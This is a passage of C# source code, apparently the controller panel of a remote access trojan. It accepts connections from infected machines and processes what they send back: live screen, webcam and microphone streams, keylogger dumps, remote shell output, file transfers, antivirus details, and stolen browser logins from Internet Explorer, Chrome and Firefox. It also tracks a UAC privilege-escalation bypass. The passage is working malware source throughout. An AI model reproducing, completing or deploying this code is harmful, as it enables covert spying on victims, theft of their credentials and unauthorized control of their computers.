                Interval = 100 // prev. 3000 //Set update frequency
            }; //Create a new timer
            update.Tick += new EventHandler(UpdateValues); //Set the tick event
            update.Start(); //Start the timer

            sh = new ScriptHost("scripts", this); //Create a new script host
            sh.LoadDllFiles(); //Load the plugin files
            sh.SetupBridge(); //Setup the function bridge for plugins
            hostToken = sCore.Integration.Integrate.GetHostToken(); //Get the host token
        }

        /// <summary>
        /// Creates a new server socket, and starts the server
        /// </summary>
        private void SetupServer()
        {
            label1.Text = "Setting up server"; //Update UI
            _serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); //Create the new server socket
            _serverSocket.Bind(new IPEndPoint(IPAddress.Any, _PORT)); //Bind the new socket to the local machine
            _serverSocket.Listen(5); //Listen for incoming connections
            _serverSocket.BeginAccept(AcceptCallback, null); //Define the client accept callback
            lcm = new LinuxClientManager(this); //Create a new linux client manager
            label1.Text = "Server is up and running\n"; //Update the UIs
        }

        /// <summary>
        /// Kill all connected clients and close the server socket
        /// </summary>
        private void CloseAllSockets()
        {
            IsStartedServer = false; //Set the server started to false
            int id = 0; //Declare the index variable

            foreach (Socket socket in _clientSockets) //Go through each connected socket
            {
                try
                {
                    SendCommand("dc", id); //Send a graceful disconnect command
                    socket.Shutdown(SocketShutdown.Both); //Shutdown the sockets
                    socket.Close(); //Close the socket
                    socket.Dispose(); //Dispose the socket
                }
                catch (Exception) //If something went wrong
                {
                    Console.WriteLine("Client" + id + " failed to send dc request!"); //Debug Function
                }
                id++;
            }

            if (lcm != null) lcm.ResetAssociation(); //Reset all linux client's from the manager

            _serverSocket.Close(); //Close the server socket
            _serverSocket.Dispose(); //Dispose the server socket

            _clientSockets.Clear(); //Remove all client sockets from the client list
        }

        /// <summary>
        /// Handling clients trying to connect to the server
        /// </summary>
        /// <param name="AR">Async result for the function</param>
        private void AcceptCallback(IAsyncResult AR)
        {
            Socket socket; //Declare a new socket
            
            try
            {
                socket = _serverSocket.EndAccept(AR); //Try to get the connecting socket
            }
            catch (Exception) //Client closed the connection before accepting
            {
                Console.WriteLine("Accept callback error"); //Debug function
                return;
            }

           _clientSockets.Add(socket); //Add the new socket to the list
           int id = _clientSockets.Count - 1; //Get the new ID for the client
           AddlvClientCallback("Client " + id); //Update the listView
           string cmd = "getinfo-" + id.ToString(); //Construct the command
           SendCommand(cmd, id); //Send the command
           socket.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, socket); //Add the reading callback
           _serverSocket.BeginAccept(AcceptCallback, null); //Restart accepting clients
        }

        /// <summary>
        /// Event handler for dismissing live updates
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void DismissUpdate(object sender, EventArgs e)
        {
            Timer me = (Timer)sender; //The timer who started the event
            label24.Text = ""; //Reset the live updates text
            label24.ForeColor = Color.Black; //Reset the live updates color
            label24.Hide(); //Hide the live updates
            me.Stop(); //Stop the timer who called the event
        }

        /// <summary>
        /// Get the ID of the client by Socket object
        /// </summary>
        /// <param name="socket">The socket which you want the client ID of</param>
        /// <returns>The client ID of the socket</returns>
        private int GetSocket(Socket socket)
        {
            int tracer = 0; //Declare index variable

            foreach (Socket s in _clientSockets) //Go through the connected sockets
            {
                if (s == socket) //If the sockets match
                {
                    return tracer; //Return the index of the socket
                }
                tracer++; //Increment the index
            }

            return -1; // Return a negative index, causing an exception
        }

        /// <summary>
        /// Handle the messages of the client
        /// </summary>
        /// <param name="AR">Async result for the function</param>
        private void ReceiveCallback(IAsyncResult AR)
        {
            Socket current = (Socket)AR.AsyncState; //Get the communicating client's socket
          
            bool dclient = false; //Declare client disconnection variable

            if (!IsStartedServer) return; //Return if the server is not started

            try
            {
                if(!IsException) //If no exceptions
                {
                    received = current.EndReceive(AR); //Get the number of recevied bytes
                }
                else //If exception then
                {
                   received = current.EndReceive(AR); //Get the jibberish
                   received = 0; //Reset it back to 0
                   IsException = false; //Disable the exception flag
                }
               
            }
            catch (Exception) //If something went wrong
            {
                int id = GetSocket(current); //get the id of the client
                reScanTarget = true; //Set the rescan flag
                reScanStart = id; //Set the starting ID for rescan
                //Console.WriteLine("Client forcefully disconnected");
                current.Close(); //Close the communicating socket
                _clientSockets.Remove(current); //Remove the socket from the clients list
                RestartServer(id); //Restart the server to rename every client
                return; //Return
            }


            if (received > 0) // Check if we have any data
            {
                byte[] recBuf = new byte[received]; //Declare a new received buffer with the size of the received bytes
                Array.Copy(_buffer, recBuf, received); //Copy from the big array to the new array, with the size of the received bytes
                bool ignoreFlag = false; //Declare the ignore flag

                if (MultiRecv) //If a surveillance module is running
                {
                    try //Try
                    {
                        // TODO: send byte codes instead of string values as headers
                        string header = Encoding.Unicode.GetString(recBuf, 0, 8 * 2); //Get the header of the message

                        if (header == "rdstream") //If it's a remote desktop stream
                        {
                            using (MemoryStream stream = new MemoryStream()) //Declare the new memory stream
                            {
                                stream.Write(recBuf, 8 * 2, recBuf.Length - 8 * 2); //Copy the data from the buffer, to the memory stream
                                                                                    //Console.WriteLine("multiRecv Length: " + recBuf.Length);
                                Bitmap deskimage = (Bitmap)Image.FromStream(stream); //Create a bitmap image from the memory stream
                                if (resdataav == 0) //If resolution data is not set
                                {
                                    resx = deskimage.Width; //Set the resolution width to the image width
                                    resy = deskimage.Height; //Set the resolution height to the image height
                                    resdataav = 1; //The resolution data is set now
                                }
                                SetImage(deskimage); //Set the image of the remote desktop
                                Array.Clear(recBuf, 0, received); //Clear the buffer
                                ignoreFlag = true; //Set the ignore flag

                                GC.Collect(); //Call the garbage collector
                                GC.WaitForPendingFinalizers();
                                System.Threading.Thread.SpinWait(5000);
                            }
                        }

                        if (header == "austream") //If it's an audio stream
                        {
                            byte[] data = new Byte[recBuf.Length]; //Declare a new buffer for audio data
                            Buffer.BlockCopy(recBuf, 8 * 2, data, 0, recBuf.Length - 8 * 2); //Copy from the received buffer to the audio buffer
                            recBuf = null; //Remove the received buffer
                            astream.BufferPlay(data); //Playback the audio stream
                            ignoreFlag = true; //Set the ignore flag
                        }

                        if (header == "wcstream") //If it's a web cam stream
                        {
                            MemoryStream stream = new MemoryStream(); //Declare a new memory stream

                            stream.Write(recBuf, 8 * 2, recBuf.Length - 8 * 2); //Copy from the buffer to the memory stream
                            Console.WriteLine("multiRecv Length: " + recBuf.Length); //Debug function

                            Bitmap camimage = (Bitmap)Image.FromStream(stream); //Create a bitmap from the memory stream

                            stream.Flush(); //Flush the stream
                            stream.Close(); //Close the stream
                            stream.Dispose(); //Dispose the stream
                            stream = null; //Remove the stream
                            SetWebCam(camimage); //Set the web cam image to the new frame
                            Array.Clear(recBuf, 0, received); //Clear the receive buffer
                            ignoreFlag = true; //Set the ignore flag
                        }
                    }
                    catch (Exception) //Something went wrong
                    {
                        //Do nothing
                    }
                }

                else if (isFileDownload && !ignoreFlag) //If file download is in progress and it's not a sureveillance data
                {
                    // TODO: this won't work for big files, write to fs on receive
                    Buffer.BlockCopy(recBuf, 0, recvFile, write_size, recBuf.Length); //Copy from the receive buffer to the file buffer
                    write_size += recBuf.Length; //Update the write size

                    if (write_size == fdl_size) //If the write size matches the full download size
                    {
                        String rLocation = fdl_location; //Get the store location
                        using (FileStream fs = File.Create(rLocation)) //Create a new fileStream at the location
                        {
                            Byte[] info = recvFile; //Get the file bytes
                            fs.Write(info, 0, info.Length); //Write the bytes to the file
                        }

                        Array.Clear(recvFile, 0, recvFile.Length); //Clear the file buffer
                        Msgbox("File Download", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Update the user on the download
                        isFileDownload = false; //Set the download flag to false
                    }
                }

                else if (!isFileDownload && !ignoreFlag) //If no file download, and it's not surveillance data
                {
                    System.Threading.Thread clThread = new System.Threading.Thread(new System.Threading.ParameterizedThreadStart(CheckLinux)); //Create a linux client checking thread
                    ClientObject obj = new ClientObject
                    {
                        buffer = recBuf, //Set the buffer of the client object
                        s = current //Set the socket of the client object
                    }; //Create a new client object

                    clThread.Start(obj); //Start checking if client is linuy or windows
                    try //Try
                    {
                        text = Encoding.Unicode.GetString(recBuf); //Get the text from the receive buffer
                        text = Decrypt(text); //Decrypt the received text
                    }
                    catch (Exception ex) //Something went wrong
                    {
                        MessageBox.Show("Original Error :: " + ex.Message); //Display the error message
                    }


                    if (lcm != null) //If linux client manager is not null
                    {
                        if (lcm.IsLinuxClient(current)) //Check if our client is a linux client
                        {
                            lcm.RunCustomCommands(recBuf); //Run the command through the manager
                            text = Encoding.ASCII.GetString(recBuf); //Convert the text to ASCII encoded charaters
                        }
                    }
                    if (text != null) //If text is not null
                    {
                        if (text.StartsWith("infoback;")) //Info received from client
                        {
                            string[] mainContainer = text.Split(';'); // Get the main data parts
                            int id = int.Parse(mainContainer[1]); //The client ID
                            string[] lines = mainContainer[2].Split('|'); //Split the data into parts
                            string name = lines[0]; //The Computer Name
                            string ip = lines[1]; //The computer's local IPv4 address
                            string time = lines[2]; //The computer's date and time
                            string av = lines[3]; //The computer's installed Anti Virus product

                            SetlvClientInfoCallback(name, ip, time, av, id); //Update the UI
                        }
                        else if (text.StartsWith("ScreenCount")) //get screen count result back from the client 
                        {
                            string screens = string.Empty; //Declare the screen variable

                            screens = text.Replace("ScreenCount", "").Replace(" ", ""); //Get the installed screens of the client

                            for (int i = 0; i < screens.Length; i++) // Loop through the screens of the client
                            {
                                SetClientScreenCountCallBack(screens[i]); // Update the UI
                            }
                        }
                        else if (text.StartsWith("setproc|")) //Process list received from client
                        {
                            foreach (string line in text.Split('\n')) //Loop through the processes
                            {
                                if (line == "") continue; //If line is empty, then skip it

                                string[] procData = line.Split('|');

                                string name = procData[1]; //The name of the process
                                string responding = procData[2]; //If the process is responding
                                string title = procData[3]; //The title of the processe's main window
                                string priority = procData[4]; //The priorty of the process
                                string path = procData[5]; //The full path of the launched process
                                string id = procData[6]; //The PID

                                SetprocInfoCallback(name, responding, title, priority, path, id); //Update the UI
                            }

                            SortList(listView2); //Sort the processes by thier name
                        }
                        else if (text.StartsWith("cmdout§")) //The client sent the output of a command line command
                        {
                            string output = text.Substring(7); //Get the output of the command
                            output = output.Replace("cmdout", String.Empty); //Format the output
                            Append(output); //Append the output to the command window
                        }
                        else if (text.StartsWith("fdrivel§")) //The client sent a list of drives
                        {
                            string data = text.Substring(8); //Get the drive listing

                            LvClear(listView3); //Clear the listView for drives

                            foreach (string drive in data.Split('\n')) //Loop through the drives
                            {
                                if (!drive.Contains("|")) continue; //If incorrect drive, then skip it
                                string[] driveData = drive.Split('|');
                                string name = driveData[0]; //Get the label of the drive (C:, D:, E: etc.)
                                string size = Convert(driveData[1]); //Get the total size of the drive

                                AddFileCallback(name, size, "N/A", name); //Update the UI
                            }
                        }
                        else if (text.StartsWith("fdirl")) //The client sent the list of entries in a directory
                        {
                            string data = text.Substring(5); //Remove the command header from the message
                            string[] entries = data.Split('\n'); //Get the entries from the data

                            for (int i = 0; i < entries.Length; i++) //Loop through every entry in the list
                            {
                                string entry = entries[i];
                                if (entry == "") continue; //If the entry is empty then skip it
                                string[] entryData = entry.Split('§');
                                string name = entryData[0]; //Get the name of the entry
                                string size = Convert(entryData[1]); //Get the total size of the entry
                                string crtime = entryData[2]; //Get the creation time of the entry
                                string path = entryData[3]; //Get the full path to the entry
                                AddFileCallback(name, size, crtime, path); //Update the UI
                            }
                        }
                        else if (text.StartsWith("backfile§")) //The client sent file contents to the editor
                        {
                            string content = text.Substring(9); //Get the content of the file
                            StartEditor(content, me); //Start the editor window
                        }
                        else if (text == "fconfirm") //Client accepted to receive a file
                        {
                            // TODO: this won't work for big files, read the file by some small amount of bytes and stream it to the client
                            byte[] databyte = File.ReadAllBytes(fup_local_path); //Get the bytes of the file
                            SendBytesToTarget(databyte); //Send the file to the client
                        }
                        else if (text == "frecv") //Client confirmed that the file is uploaded
                        {
                            Msgbox("File Upload", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notify the user
                        }
                        else if (text.StartsWith("finfo§")) //Client sent info about a file we want to download
                        {
                            fdl_size = int.Parse(text.Substring(6)); //Get the size of the file
                            recvFile = new byte[fdl_size]; //Create a new buffer for the file
                            isFileDownload = true; //Set the file download flag
                            SendToTarget("fconfirm"); //Notify the client to send the file
                        }
                        else if (text.StartsWith("f1§")) //The client sent the up1 directory in the tree
                        {
                            string dir = text.Substring(3); //Get the parent directory

                            if (dir != "drive") GetParentDirectory(dir); //If it's not the drive list the update the file list
                            else //If it's the drive list
                            {
                                CurrentPath = "drive"; //Set the current path to the drive listing
                                SendToTarget("fdrive"); //List the drives
                                LvClear(listView3); //Clear the file list
                            }
                        }
                        else if (text.StartsWith("putklog")) //Client sent the keylog
                        {
                            string dump = text.Substring(7); //Remove the command header
                            SetLog(dump); //Update the UI
                        }
                        else if (text.StartsWith("dclient")) //Client is going to disconnect
                        {
                            // TODO: look into client disconnection this seems like a hack from a quick glance
                            Console.WriteLine("Client Disconnected"); //Debug Function
                            dclient = true; //Set the disconnect flag
                            SwitchTab(tabPage1); //Switch to the client selection module
                            killtarget = GetSocket(current); //Get the id of the affected socket
                            killSocket = current; //Set the affected socket
                            if (controlClient == killtarget) //If the affected client is the controlled one
                            {
                                //TODO: write UI reset code
                                RemotePipe[] rpArray = { null }; //Create a new remote pipe array
                                sCore.RAT.ExternalApps.ClearIPCConnections(hostToken); //Clear the list of ipc connections for plugins
                                Array.Copy(rPipeList.ToArray(), rpArray, rPipeList.Count); //Get the list of pipes
                                foreach (RemotePipe rp in rpArray) //Go through each pipe in the list
                                {
                                    if (rp == null) continue; //If the pipe is closed, then skip it
                                    rp.RemoteRemove = false; //Set the remove flag
                                    ClosePipe(rp); //Close the remote pipe
                                }

                                rPipeList.Clear(); //Clear the list of pipes
                            }
                            int id = killtarget; //Declare the client id
                            reScanTarget = true; //Set the rescan flag
                            reScanStart = id; //Set the rescan starting id
                            if (lcm != null) //If linux client manager is enabled
                            {
                                if (lcm.IsLinuxClient(id)) lcm.RemoveAssociation(id); //If it's a linux client, then remove it from the manager
                            }
                            Console.WriteLine("Timer Removed Client"); //Debug Function
                            killSocket.Close(); //Close the affected socket
                            _clientSockets.Remove(killSocket); //Remove the affected socket from the list
                            RestartServer(id); //Restart the server
                        }
                        else if (text.StartsWith("alist")) //Client sent the list of audio devies of thier machine
                        {
                            LvClear(listView4); //Clear the audio devices listView
                            string data = text.Substring(5); //Remove the command header from the message
                            int devices = 0; //Declare the count of devices
                            string[] deviceData = data.Split('§');
                            for (int i = 0; i < deviceData.Length; i++) //Go through all devices
                            {
                                string device = deviceData[i];
                                string[] deviceInfo = device.Split('|');
                                string name = deviceInfo[0]; //Get the name of the device
                                string channel = deviceInfo[1]; //Get the channel ID for the device
                                AddAudio(name, channel); //Update the UI
                                devices++; //Increment the count of devices
                            }

                            if (devices == 0) //If no devices
                            {
                                Msgbox("Warning", "No audio capture devices present on this target", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
                            }
                        }
                        else if (text.StartsWith("wlist")) //Client sent the list of installed web cams
                        {
                            // TODO: extract to method along with audio devices
                            LvClear(listView5); //Clear the web cam listView
                            string data = text.Substring(5); //Remove the commmand header from the message
                            int devices = 0; //Declare the count of devices
                            string[] deviceData = data.Split('§');
                            for (int i = 0; i < deviceData.Length; i++) //Go through all devices
                            {
                                string device = deviceData[i];
                                if (device == "") continue; //If the device is empty, then skip it
                                string[] deviceInfo = device.Split('|');
                                string id = deviceInfo[0]; //Get the ID of the device
                                string name = deviceInfo[1]; //Get the name of the device
                                AddCam(id, name); //Update the UI
                                devices++; //Incremen the count of the devices
                            }

                            if (devices == 0) //If no devices installed
                            {
                                Msgbox("Warning", "No video capture devices present on this target!", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
                            }
                        }
                        else if (text.StartsWith("setstart§")) //Client sent the R.A.T application working directory
                        {
                            remStart = text.Substring(9); //Get the directory
                        }
                        else if (text == "getpwu") //Client sent error because password fox is not found in the directory
                        {
                            System.Threading.Thread notify = new System.Threading.Thread(new System.Threading.ThreadStart(PwuNotification)); //Create a notify thread
                            notify.Start(); //Start the thread
                        }
                        else if (text.StartsWith("iepw")) //Client sent the Internet Explorer recovered passwords
                        {
                            string[] ieLogins = text.Split('\n'); //Get every IE logins
                            if (ieLogins[1] == "failed") //If failed to recover, or none exists
                            {
                                Console.WriteLine("no ie logins"); //Debug Function
                            }
                            else
                            {
                                for (int i = 0; i < ieLogins.Length; i++) //Go through the logins
                                {
                                    if (i == 0) continue; // Skip the first item (header)
                                    string login = ieLogins[i];
                                    string[] src = login.Split('§'); //Split to data parts
                                    string user = src[0]; //Get the username
                                    string password = src[1]; //Get the password
                                    string url = src[2]; //Get the URL
                                    ListViewItem lvi = new ListViewItem
                                    {
                                        Text = url //Set the url
                                    }; //Create a new listView item
                                    lvi.SubItems.Add(user); //Set the username
                                    lvi.SubItems.Add(password); //Set the password
                                    LvAddItem(listView6, lvi, 1); //Set the item's group (1 = group Internet Explorer)
                                }
                            }
                        }
                        else if (text.StartsWith("gcpw")) //Client sent Google Chrome Logins
                        {
                            string[] gcLogins = text.Split('\n'); //Get the logins
                            if (gcLogins[1] == "failed") //If failed to recover or none exists
                            {
                                Console.WriteLine("no gc logins"); //Debug Function
                            }
                            else
                            {
                                for (int i = 0; i < gcLogins.Length; i++) //Go through every login credentials
                                {
                                    if (i == 0) continue; // Skip the first item (header)
                                    string login = gcLogins[i];
                                    string[] src = login.Split('§'); //Split the data to parts
                                    string user = src[1]; //Get the username
                                    string password = src[2]; //Get the password
                                    string url = src[0]; //Get the URL
                                    ListViewItem lvi = new ListViewItem
                                    {
                                        Text = url //Set the URL
                                    }; //Create a new listView item
                                    lvi.SubItems.Add(user); //Set the username
                                    lvi.SubItems.Add(password); //Set the password
                                    LvAddItem(listView6, lvi, 0); //Set the item's group (0 = group Google Chrome)
                                }
                            }
                        }
                        else if (text.StartsWith("ffpw")) //Client sent Fire Fox logins
                        {
                            string[] ffLogins = text.Split('\n'); //Get the logins
                            if (ffLogins[1] == "failed") //If failed to recover or none exists
                            {
                                Console.WriteLine("no ff logins"); //Debug Function
                            }
                            else
                            {
                                for (int i = 0; i < ffLogins.Length; i++) //Go through the logins
                                {
                                    if (i == 0) continue; // Skip the first item (header)
                                    string login = ffLogins[i];
                                    string[] src = login.Split('§'); //Split the data to parts
                                    string user = src[2]; //Get the username
                                    string password = src[3]; //Get the password
                                    string url = src[1]; //Get the URL
                                    ListViewItem lvi = new ListViewItem
                                    {
                                        Text = url //Set the URL
                                    }; //Create a new listView item
                                    lvi.SubItems.Add(user); //Set the username
                                    lvi.SubItems.Add(password); //Set the password
                                    LvAddItem(listView6, lvi, 2); //Set the item's group (2 = group Firefox)
                                }
                            }
                        }
                        else if (text.StartsWith("error")) //If client sent error message
                        {
                            string[] errorData = text.Split('§');
                            string code = errorData[1]; //Get the message's code
                            string title = errorData[2]; //Get the message's title
                            string message = errorData[3]; //Get the message's body
                            label24.ForeColor = Color.Gold; //Set the text color to gold
                            label24.BackColor = Color.Black; //Set the back color to read
                            SetErrorText("Error " + code + "\n" + title + "\n" + message); //Set the error message
                            ShowError(); //Update the UI
                            // TODO: get rid of timer if we can (I think it hurts performance, and it's not elegant)
                            Timer t = new Timer
                            {
                                Interval = 10000 //Set the timer's frequency to 10 seconds
                            }; //Create a new timer
                            t.Tick += new EventHandler(DismissUpdate); //Set the tick handler
                            t.Start(); //Start the timer

                            Types.ClientErrorMessage eMsg = new Types.ClientErrorMessage(code, message, title); //Create a plugin error object

                            sCore.RAT.ServerSettings.RaiseErrorEvent(eMsg); //Notify the plugins of the error
                        }
                        else if (text.StartsWith("ipc§")) //Client sent IPC output message
                        {
                            string serverName = text.Split('§')[1]; //Get the IPC server's name
                            string message = text.Substring(4); //Get the message body
                            message = message.Substring(message.IndexOf('§') + 1); //Format the message

                            foreach (RemotePipe rp in rPipeList) //Gor through the remote pipe list
                            {
                                if (rp.pname == serverName) //If the servers match
                                {
                                    rp.WriteOutput(message); //Write the output to the form
                                    break; //Break the loop
                                }
                            }
                        }
                        else if (text == "uac§a_admin") //Client sent that it's running as admin
                        {
                            Msgbox("Warning", "R.A.T is already running in administrator mode!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notify the user
                        }
                        else if (text == "uac§f_admin") //Client sent that UAC bypass core files are missing
                        {
                            EnableButton(button20, true); //Enable Auto download
                            Msgbox("Error!", "UAC Bypass Core files not found!\r\nDownload and Compile them manually from the Bypass-Uac repo\r\nThen upload them to the target", MessageBoxButtons.OK, MessageBoxIcon.Error); //Notify the user
                        }
#if EnableAutoLoad
                    if (text.StartsWith("uacload§")) //Client sent auto download progress
                    {
                        string progress = text.Split('§')[1]; //Get the progression
                        autoLoadProgress += int.Parse(progress); //Increment the progress
                        UpdateProgress(progressBar1, autoLoadProgress); //Update the progress bar with the value
                        SetControlText(label36, autoLoadProgress.ToString() + "%"); //Update the label with the value

                        if (autoLoadProgress == 100) //If download finished
                        {
                            autoLoadProgress = 0; //Reset the progress
                            HideControl(progressBar1); //Hide the progress bar
                            HideControl(label36); //Hide the label
                            SetControlText(label36, "0%"); //Reset the label text
                            UpdateProgress(progressBar1, 0); //Reset the progress bar value
                            EnableButton(button20, false); //Disable the auto download button
                            Msgbox("Download Complete!", "Core files downloaded, you may retry bypassing UAC now", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notfiy the user
                        }
                    }
#endif
                    }
                } 
            }
           

            if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current); //If client is not disconnecting, restart the reading

	    }

#endregion

#region Cross Thread Functions

        // TODO: minimize the amount of delegate declarations (we can reuse them with a common name)

        /// <summary>
        /// Delegate used to set the remote desktop frame image
        /// </summary>
        /// <param name="image">The frame to update the remote desktop with</param>
        private delegate void setImageCallback(Bitmap image);

        /// <summary>
        /// Set the image of the remote desktop controls
        /// </summary>
        /// <param name="image">The new frame by the client</param>
        private void SetImage(Bitmap image)
        {
            if (InvokeRequired) //If we need to invoke
            {
                setImageCallback callback = new setImageCallback(SetImage); //Create the callback
                // if (image != null) this.Invoke(callback, new object[] { image });
                if (image != null) //If the image is not null
                {
                    try
                    {
                        Invoke(callback, new object[] { image }); //Trying to invoke the callback
                    }
                    catch //(Exception ex)
                    {
                        // MessageBox.Show("Connection Lost  ERROR Message = " + ex.Message);
                    }
                }
            }
            else
            {
                if (!IsRdFull) //If not in full screen mode
                {
                    // if (image == null) Console.WriteLine("image is null");

                    if (image != null) //If image is not null
                    {
                        pictureBox1.Image = image; //Set the small image to the new frame
                    }

                }
                else //If in full screen mode
                {
                    if (image != null) //If the image is not null
                    {
                        Rdxref.image = image; //Set the full screen frame to the new frame
                    }
                }

                if (rdRouteUpdate != "route0.none") //If we have a routed windows of the remote desktop module
                {
                    String route = rdRouteUpdate.Split('.')[0]; //Get the route of the windows
                    int routeIndex = int.Parse(route.Replace("route", "")) - 1; //Get the index of the routed window
                    Form tRoute = routeWindow[routeIndex]; //Get the routed windows
                    Control.ControlCollection elements = tRoute.Controls; //Get every control in the window
                    foreach (Control c in elements) //Loop through the controls
                    {
                        if (c.Tag == null) continue; //If the control has no tag, then skip it
                        if (c.Tag.ToString() == rdRouteUpdate) //If the control's tag matches the remote desktop route update
                        {
                            PictureBox rdUpdate = c as PictureBox; //Convert the control to a pictureBox
                            rdUpdate.Image = image; //Set the new frame of the image
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Delegate used to update the image of the remote webCam display controls
        /// </summary>
        /// <param name="image">The new frame to set</param>
        private delegate void setWebCamCallback(Bitmap image);

        /// <summary>
        /// Update the frame of the webCam display controls
        /// </summary>
        /// <param name="image">The new frame sent by the client</param>
        private void SetWebCam(Bitmap image)
        {
            if (this.InvokeRequired) //If we need to invoke
            {
                setWebCamCallback callback = new setWebCamCallback(SetWebCam); //Create a callback
                this.Invoke(callback, new object[] { image }); //Invoke
            }
            else
            {
                pictureBox2.Image = image; //Set the image of the webCam
                if (wcRouteUpdate != "route0.none") //If we have a routed window to the webCam module
                {
                    String route = rdRouteUpdate.Split('.')[0]; //Get the route of the window
                    int routeIndex = int.Parse(route.Replace("route", "")) - 1; //Get the ID of the window
                    Form tRoute = routeWindow[routeIndex]; //Get the from of the routed window
                    Control.ControlCollection elements = tRoute.Controls; //Get every control in the routed window
                    foreach (Control c in elements) //Loop through the elements
                    {
                        if (c.Tag == null) continue; //If the element has no tag, then skip it
                        if (c.Tag.ToString() == wcRouteUpdate) //If the elements tag matches the route window for webCam
                        {
                            PictureBox wcUpdate = c as PictureBox; //Convert the control to a pictureBox
                            wcUpdate.Image = image; //Set the new frame of the image
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Delegate used for adding new clients to the listView
        /// </summary>
        /// <param name="clientid">The ID of the new client</param>
        private delegate void addlvClient(String clientid);

        /// <summary>
        /// Add a new client to the listView
        /// </summary>
        /// <param name="clientid">The ID of the new client</param>
        private void AddlvClientCallback(String clientid)
        {
            if (InvokeRequired) //Check if we need to invoke
            {
                addlvClient k = new addlvClient(AddlvClientCallback); //Create the callback
                Invoke(k, new object[] { clientid }); //Invoke
            }
            else
            {
                listView1.Items.Add(clientid); //Add the new client to the list
            }
        }

        /// <summary>
        /// Delegate used to restart the server in case a client disconnected
        /// </summary>
        /// <param name="id">The ID of the disconnected client</param>
        private delegate void restartServerCallback(int id);

        /// <summary>
        /// Restart the server, if a client disconnected
        /// </summary>
        /// <param name="id">ID of the disconnected client</param>
        private void RestartServer(int id)
        {
            if (InvokeRequired) //If we need to invoke
            {
                restartServerCallback callback = new restartServerCallback(RestartServer); //Create the callback
                Invoke(callback, new object[] { id }); //Invoke
            }
            else
            {
                button1.PerformClick(); //Stop the server
                button1.PerformClick(); //Start the server
                label24.ForeColor = Color.Red; //Change the live update text color to red
                label24.Text = "Client " + id.ToString() + " Disconnected\nOther Sessions restored!"; //Set the live update notification
                label24.Show(); //Show the live update
                Timer t = new Timer
                {
                    Interval = 5000 //Set the frequency to 5 seconds
                }; //Create a new timer
                t.Tick += new EventHandler(DismissUpdate); //Set the tick event handler
                t.Start(); //Start the timer
            }
        }

        /// <summary>
        /// Delegate used to set a control's text Property
        /// </summary>
        /// <param name="contorol">The control to change the text of</param>
        /// <param name="text">The new text of the control</param>
        private delegate void SetControlTextC(Control contorol, string text);

        /// <summary>
        /// Change the text property of a control
        /// </summary>
        /// <param name="control">The control to change the text of</param>
        /// <param name="text">The new text of the control</param>
        private void SetControlText(Control control, string text)
        {
            if (InvokeRequired) //If we need to invoke
            {
                SetControlTextC callback = new SetControlTextC(SetControlText); //Create the callback
                Invoke(callback, new object[] { control, text }); //Invoke
                return; //Return
            }

            control.Text = text; //Set the control's text
        }

        /// <summary>
        /// Delegate used to hide any control
        /// </summary>
        /// <param name="control">The control to hide</param>
        private delegate void HideControlC(Control control);

        /// <summary>
        /// Hide a control
        /// </summary>
        /// <param name="control">The control to hide</param>
        private void HideControl(Control control)
        {
            if (InvokeRequired) //If we need to invoke
            {
                HideControlC callback = new HideControlC(HideControl); //Create the callback
                Invoke(callback, new object[] { control }); //Invoke
                return; //Return
            }

            control.Hide(); //Hide the control
        }

        /// <summary>
        /// Delegarte used to update the progress of a progress bar
        /// </summary>
        /// <param name="pb">The progress bar to update</param>
        /// <param name="progress">The new progress value</param>
        private delegate void UpdateProgressC(ProgressBar pb, int progress);

        /// <summary>
        /// Update the value of a progress bar
        /// </summary>
        /// <param name="pb">The progress bar to update the value of</param>
        /// <param name="progress">The new progress</param>
        private void UpdateProgress(ProgressBar pb, int progress)
        {
            if (InvokeRequired) //If we need to invoke
            {
                UpdateProgressC callback = new UpdateProgressC(UpdateProgress); //Create a callback
                Invoke(callback, new object[] { pb, progress }); //Invoke the callback
                return; //Return
            }

            pb.Value = progress; //Set the new progress
        }

        /// <summary>
        /// Delegate used to close a remote pipe
        /// </summary>
        /// <param name="rp">The remote pipe to close</param>
        private delegate void ClosePipeCallback(RemotePipe rp);

        /// <summary>
        /// Close a remote pipe
        /// </summary>
        /// <param name="rp">The remote pipe to close</param>
        private void ClosePipe(RemotePipe rp)
        {
            if (InvokeRequired) //If we need to invoke
            {
                ClosePipeCallback c = new ClosePipeCallback(ClosePipe); //Create a callback
                Invoke(c, new object[] { rp }); //Invoke the callback
                return; //Return
            }

            rp.Close(); //Close the pipe window
        }

        /// <summary>
        /// Delegate used to enable or disable a button
        /// </summary>
        /// <param name="button">The button to change the state of</param>
        /// <param name="state">The new state of the button</param>
        private delegate void EnableButtonCallback(Button button, bool state);

        /// <summary>
        /// Enable or Disable a button
        /// </summary>
        /// <param name="button">The button to change the state of</param>
        /// <param name="state">The new state of the button</param>
        private void EnableButton(Button button, bool state)
        {
            if (InvokeRequired) //If we need to invoke
            {
                EnableButtonCallback ebc = new EnableButtonCallback(EnableButton); //Create a callback
                Invoke(ebc, new object[] { button, state }); //Invoke the callback
                return; //Return
            }

            button.Enabled = state; //Change the state of the button
        }

        /// <summary>
        /// Check if a client if a linux client
        /// </summary>
        /// <param name="data">The client object to check</param>
        private void CheckLinux(object data)
        {
            ClientObject obj = (ClientObject)data; //Convert the object to Client Object
            byte[] buffer = obj.buffer; //Get the buffer of the object
            string command = Encoding.ASCII.GetString(buffer); //Get the command from the buffer
            if (command == "linuxClient") //if the command is linuxClient
            {
                //Handle Linux Clients
                Console.WriteLine("Linux Client detected!"); //Debug Function
                int socketID = GetSocket(obj.s); //Get the client ID of the socket
                if (lcm != null) //If linux client manager is enabled
                {
                    lcm.AddAssociation(socketID); //Add the client to the manager
                }
                else
                {
                    Console.WriteLine("CheckLinux, lcm was null"); //Linux client manager is not enabled
                }
            }
        }

        /// <summary>
